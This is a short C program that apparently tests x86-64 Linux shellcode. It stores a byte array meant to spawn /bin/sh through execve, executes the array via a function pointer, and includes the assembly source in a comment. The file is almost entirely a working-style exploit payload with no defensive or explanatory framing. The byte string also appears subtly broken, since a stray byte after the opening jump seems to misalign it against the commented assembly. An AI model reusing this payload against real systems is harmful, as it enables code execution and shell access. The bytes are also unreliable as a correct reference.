#include <stdio.h>
#include <string.h>



	
unsigned char code[]=\
"\xeb\x1b\x1d\x48\x31\xc0\x5f\x88\x67\x07\x48\x89\x7f\x08\x48\x89\x47\x10\x48\x8d\x77\x08\x48\x8d\x57\x10\xb0\x3b\x0f\x05\xe8\xe0\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x42\x42\x42\x42\x43\x43\x43\x43\x43\x43\x43\x43";

main()
{
	printf("Shellcode Length:%d\n Bytes",(int)strlen(code));
	int (*ret)()=(int(*)())code;
	ret();
}

/*

global _start

section .text

_start:
	jmp call_shellcode
	
shellcode:
	xor rax,rax
	pop rdi					;rdi points to the starting of the string
	
	mov [rdi +7],byte ah			;setting the value of the byte A as 0x0
	mov [rdi +8],rdi			;storing the address of the string in place of BBBBBBBB
	mov [rdi +16],rax			:storing null values in place of CCCCCCCC

	lea rsi,[rdi +8]			;rsi points to the location containing address of the string
	lea rdx,[rdi +16]			;rdx points to the location of the null

	mov al,59				;stroing syscall number of execve
	syscall

call_shellcode:
	call shellcode
	string: db "/bin/shABBBBBBBBCCCCCCCC"

*/

